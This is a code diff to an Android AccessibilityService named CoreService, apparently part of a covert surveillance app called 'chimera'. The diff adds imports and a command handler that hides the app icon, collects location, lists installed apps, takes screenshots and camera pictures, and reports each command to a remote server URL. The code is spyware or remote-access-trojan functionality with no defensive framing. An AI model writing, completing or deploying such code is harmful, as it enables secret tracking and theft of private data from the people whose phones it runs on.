@@ -1,41 +1,37 @@
-// All imports are the same as the last version.
+package com.chimera;
+
+import android.Manifest;
+import android.accessibilityservice.AccessibilityService;
+import android.annotation.SuppressLint;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+import android.os.SystemClock;
+import android.provider.Settings;
+import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
+import androidx.core.content.ContextCompat;
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.toolbox.JsonObjectRequest;
+import com.android.volley.toolbox.Volley;
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationServices;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.util.List;
 
 public class CoreService extends AccessibilityService {
-    // All variables and other methods are the same.
-    // ONLY handleCommand() changes.
-    // ...
-
-    private void handleCommand(Intent intent) {
-        String action = intent.getAction();
-        if (action == null) return;
-        String command = action.replace("com.chimera.action.", "").toUpperCase();
-        submitDataToServer("lifecycle", "Command received: " + command);
-
-        switch (command) {
-            case "TOGGLE_ICON":
-                boolean show = Boolean.parseBoolean(intent.getStringExtra("show"));
-                handleToggleIcon(show);
-                break;
-            case "GET_LOCATION":
-                handleGetLocation();
-                break;
-            case "LIST_APPS":
-                handleListApps();
-                break;
-            case "SCREENSHOT":
-                // THIS IS THE FINAL, CORRECT IMPLEMENTATION
-                Intent proxyIntent = new Intent(this, ProxyActivity.class);
-                proxyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(proxyIntent);
-                break;
-            case "PICTURE":
-                handleTakePicture(intent.getStringExtra("camera_id"));
-                break;
-        }
-    }
-
-    // ... All other methods (onAccessibilityEvent, handleGetLocation, etc.) are exactly the same as the last version.
-    // ... No other changes are needed in this file.
+    
     private static final String TAG = "CoreService";
     private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
 
@@ -88,6 +84,34 @@ public class CoreService extends AccessibilityService {
             handleCommand(intent);
         }
         return START_STICKY;
+    }
+
+    private void handleCommand(Intent intent) {
+        String action = intent.getAction();
+        if (action == null) return;
+        String command = action.replace("com.chimera.action.", "").toUpperCase();
+        submitDataToServer("lifecycle", "Command received: " + command);
+
+        switch (command) {
+            case "TOGGLE_ICON":
+                boolean show = Boolean.parseBoolean(intent.getStringExtra("show"));
+                handleToggleIcon(show);
+                break;
+            case "GET_LOCATION":
+                handleGetLocation();
+                break;
+            case "LIST_APPS":
+                handleListApps();
+                break;
+            case "SCREENSHOT":
+                Intent proxyIntent = new Intent(this, ProxyActivity.class);
+                proxyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(proxyIntent);
+                break;
+            case "PICTURE":
+                handleTakePicture(intent.getStringExtra("camera_id"));
+                break;
+        }
     }
 
     @Override
